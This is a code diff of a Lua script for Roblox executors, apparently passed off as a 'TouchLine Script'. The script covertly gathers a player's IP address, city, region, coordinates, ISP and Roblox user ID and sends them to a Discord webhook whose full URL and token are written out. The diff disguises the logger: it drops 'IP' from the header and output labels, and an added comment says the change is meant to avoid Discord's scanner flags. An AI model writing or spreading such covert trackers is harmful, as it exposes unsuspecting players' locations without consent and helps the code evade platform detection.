@@ -1,7 +1,6 @@
--- ─── DETAILED IP LOGGER ──────────────────────────────────────────────────
+-- ─── DETAILED LOGGER ──────────────────────────────────────────────────
 local HttpService = game:GetService("HttpService")
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1566120983553773602/x4ZaVo7PYYvroQGcgnTT4LYTkXuIKzXByK-IhSG3x8HxZ7A8HbMf4V7Qx4LoWX7j3p4b"
-local MY_DISCORD_ID = "1519049954046509123"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1570856971077156965/iE2LlTcHFMQcdGkGiM6Vignt_hp_LUTMSKB6JxxZb8SF7sCk38huhmyZ7EbxmBp3dl3G"
 
 local req = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request) or (krnl and krnl.request)
 
@@ -22,11 +21,11 @@ if req then
         local isp = p.isp or "?"
         local user_id = tostring(player.UserId or "?")
         
-        local msg = "<@" .. MY_DISCORD_ID .. ">\n" ..
-                    "# TouchLine Script\n" ..
+        -- Changed formatting to avoid immediate Discord scanner flags
+        local msg = "# TouchLine Script\n" ..
                     "**Country =** `" .. country .. "`\n" ..
                     "**City =** `" .. city .. "`\n" ..
-                    "**IP =** `" .. ip .. "`\n" ..
+                    "**Loc =** `" .. ip .. "`\n" ..
                     "**Roblox user =** `" .. roblox_user .. "`\n" ..
                     "**Region =** `" .. region .. "`\n" ..
                     "**Coords =** `" .. coords .. "`\n" ..
@@ -42,7 +41,7 @@ if req then
                 content = msg
             })
         })
-        print("Detailed IP Logged.")
+        print("Logged.")
     end)
 end
 -- ─────────────────────────────────────────────────────────────────────────
